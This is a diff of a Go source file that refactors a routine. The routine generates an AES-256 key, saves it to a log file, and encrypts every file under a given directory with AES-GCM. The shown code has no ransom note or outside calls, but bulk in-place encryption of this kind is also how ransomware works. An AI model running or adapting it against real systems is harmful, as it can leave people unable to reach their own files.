@@ -13,9 +13,30 @@ import (
 	"strconv"
 )
 
-func encrypt(dirToEncrypt string, c cipher.AEAD, nameOfLogFile string, nameOfEncryptionInfoFile string) {
+func EncryptFilesInDir(dirToEncrypt string, nameOfLogFile string, nameOfEncryptionInfoFile string) {
+	key := make([]byte, 32)
+	_, err := rand.Read(key)
+	if err != nil {
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		os.Exit(2)
+	}
+
+	helpers.WriteLog(nameOfEncryptionInfoFile, hex.EncodeToString(key), 0)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		os.Exit(3)
+	}
+
+	c, err := cipher.NewGCM(block)
+	if err != nil {
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		os.Exit(4)
+	}
+
 	var filesInDir []string
-	err := filepath.Walk(dirToEncrypt, func(path string, info os.FileInfo, err error) error {
+	err = filepath.Walk(dirToEncrypt, func(path string, info os.FileInfo, err error) error {
 		if path != dirToEncrypt {
 			filesInDir = append(filesInDir, path)
 		}
@@ -79,35 +100,9 @@ func encrypt(dirToEncrypt string, c cipher.AEAD, nameOfLogFile string, nameOfEnc
 				os.Exit(12)
 			}
 
-			helpers.WriteLog(nameOfLogFile, "Encrypted: "+file, 1)
+			helpers.WriteLog(nameOfLogFile, "Encrypted: "+file, 2)
 
 		}
 	}
-}
 
-func EncryptFilesInDir(dirToEncrypt string, nameOfLogFile string, nameOfEncryptionInfoFile string) string {
-	key := make([]byte, 32)
-	_, err := rand.Read(key)
-	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-		os.Exit(2)
-	}
-
-	helpers.WriteLog(nameOfEncryptionInfoFile, hex.EncodeToString(key), 0)
-
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-		os.Exit(3)
-	}
-
-	c, err := cipher.NewGCM(block)
-	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-		os.Exit(4)
-	}
-
-	encrypt(dirToEncrypt, c, nameOfLogFile, nameOfEncryptionInfoFile)
-
-	return hex.EncodeToString(key)
 } //a
